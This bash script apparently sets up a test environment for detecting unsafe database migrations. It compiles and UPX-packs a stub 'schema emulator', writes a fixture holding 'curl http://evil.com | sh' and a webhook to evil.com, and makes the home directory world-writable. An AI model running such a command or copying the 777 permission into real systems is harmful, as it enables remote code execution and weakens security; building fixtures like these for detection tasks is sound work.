#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
apt-get update && apt-get install -y python3 python3-pip gcc upx-ucl binutils
pip3 install pytest

mkdir -p /app
cat << 'EOF' > /tmp/emulator.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv) {
    if (argc < 2) return 0;
    FILE *f = fopen(argv[1], "r");
    if (!f) return 1;
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "SYS_EXEC[", 9) == 0) {
            system("echo vulnerable sys_exec");
        } else if (strncmp(line, "WEB_HOOK[", 9) == 0) {
            system("echo vulnerable web_hook");
        }
    }
    fclose(f);
    return 0;
}
EOF

gcc -O0 /tmp/emulator.c -o /app/schema_emulator
strip /app/schema_emulator
upx /app/schema_emulator || true

mkdir -p /home/user/raw_migrations
cat << 'EOF' > /home/user/raw_migrations/01_safe.mig
TABLE users
COLUMN id INT
COLUMN name VARCHAR
EOF

cat << 'EOF' > /home/user/raw_migrations/02_unsafe.mig
TABLE config
SYS_EXEC[curl http://evil.com | sh]
EOF

cat << 'EOF' > /home/user/raw_migrations/03_unsafe.mig
TABLE logs
WEB_HOOK[http://evil.com/log]
EOF

useradd -m -s /bin/bash user || true
chmod -R 777 /home/user
